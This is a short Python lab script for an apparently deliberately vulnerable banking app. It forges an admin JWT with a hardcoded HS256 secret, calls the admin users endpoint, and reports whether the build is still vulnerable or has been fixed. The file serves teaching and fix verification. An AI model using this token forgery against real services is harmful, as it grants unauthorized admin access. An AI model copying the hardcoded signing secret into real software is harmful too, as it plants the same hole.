"""LAB 8 (A04 — Cryptographic Failures): hardcoded JWT signing secret.

Exploit: sign a token with the hardcoded secret and use it as admin. On the
vulnerable build the forged token is accepted — the signature verifies
because the secret is a literal in the source tree. After the fix the secret
comes from the environment, so the same forged token is rejected.
"""

from common import Client, Result, Verdict

ID = 8
TITLE = "Hardcoded JWT secret — forge an admin token"
ENDPOINT = "any authenticated endpoint (the admin API proves it best)"
AFFECTED = "backend/src/main/java/com/securebank/security/JwtKeys.java -> secret()"

HARDCODED_SECRET = "hardcoded-jwt-secret-do-not-ship-2024"


def run(ctx: Client) -> Result:
    forged = ctx.forge_jwt(
        {"user_id": 1, "username": "admin", "role": "admin"},
        alg="HS256",
        secret=HARDCODED_SECRET,
    )

    r = ctx.get("/api/admin/users", token=forged)

    if r.status_code == 200:
        try:
            users = r.json()
        except ValueError:
            users = None
        count = len(users) if isinstance(users, list) else "?"
        return Result(
            Verdict.VULNERABLE,
            f"a token signed with the hardcoded secret was accepted as admin "
            f"({count} users returned)",
        )

    if r.status_code in (401, 403):
        return Result(
            Verdict.FIXED,
            f"the forged token was rejected (HTTP {r.status_code}) — the secret "
            "is no longer the hardcoded literal",
        )

    return Result(Verdict.INCONCLUSIVE, f"unexpected HTTP {r.status_code}: {r.text[:200]}")
